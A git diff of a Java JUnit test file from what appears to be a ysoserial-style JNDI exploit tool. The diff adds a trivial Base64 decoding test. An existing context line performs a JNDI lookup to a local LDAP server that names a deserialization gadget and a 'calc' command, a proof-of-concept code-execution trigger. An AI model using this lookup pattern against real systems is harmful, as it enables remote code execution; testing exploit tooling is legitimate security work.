@@ -1,10 +1,12 @@
 package com.h2tg.ysogate;
 
 import org.junit.Test;
+import static org.apache.tomcat.util.codec.binary.Base64.isBase64;
 
 import javax.naming.Context;
 import javax.naming.InitialContext;
 import javax.naming.NamingException;
+import java.util.Base64;
 
 public class CiTest {
     @Test
@@ -21,4 +23,11 @@ public class CiTest {
         Object result = ctx.lookup("ldap://127.0.0.1:1389/Deserialize/"+gadget+"/Command/calc");
     }
 
+    @Test
+    public void baseTest() throws NamingException
+    {
+        String encText = "1234";
+        System.out.println(Base64.getUrlDecoder().decode(encText));
+//        isBase64();
+    }
 }
